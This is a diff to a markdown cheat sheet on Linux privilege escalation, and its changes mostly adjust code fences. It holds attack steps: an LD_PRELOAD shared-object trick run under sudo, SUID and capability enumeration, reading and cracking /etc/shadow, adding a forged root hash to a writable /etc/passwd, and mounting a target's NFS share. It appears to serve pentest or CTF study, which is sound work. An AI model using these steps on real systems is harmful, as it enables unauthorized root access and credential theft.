@@ -85,7 +85,7 @@ if ruid == euid
 Check for LD_PRELOAD (with the env_keep option)
 Write a simple C code compiled as a share object (.so extension) file
 Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
-
+```
 
 shell.c
 ``````
@@ -107,7 +107,7 @@ compile it using gcc
 ``````
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ``````
-
+```
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 
 ```
@@ -119,15 +119,15 @@ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 SUID
 ```
 list files that have SUID or SGID set
+```
 ``````
 find / -type f -perm -04000 -ls 2>/dev/null
 //compare executables on this list with gtfobins
 ``````
 
-
+``````
 look for /etc/passwd(check if writable) and /etc/shadow(check if readable)
 
-``````
 readable /etc/shadow
 
 #use johntheripper for contents of shadow file
@@ -143,22 +143,16 @@ openssl passwd -1 -salt <enter-salt> <enter-password>
 #add this hash value as password with a username in /etc/passwd
 
 #add root:/bin/bash to provide a root shell
-
-```
+``````
 
 
 CAPABILITIES
-```
 check different file capabilities
 ``````
 getcap -r / 2>/dev/null
 ``````
 check gtfobins for capabilities
-
-
 note: you wont find capabilities when enumerating files for suid
-
-```
 
 
 
@@ -193,3 +187,4 @@ showmount -e <target-ip>   //on attacker machine
 mkdir /<mountable-share>/backupsonattacketmachine
 
 mount -o rw <target-ip>:/backups /<mountable-share>/backupsonattackermachine
+```
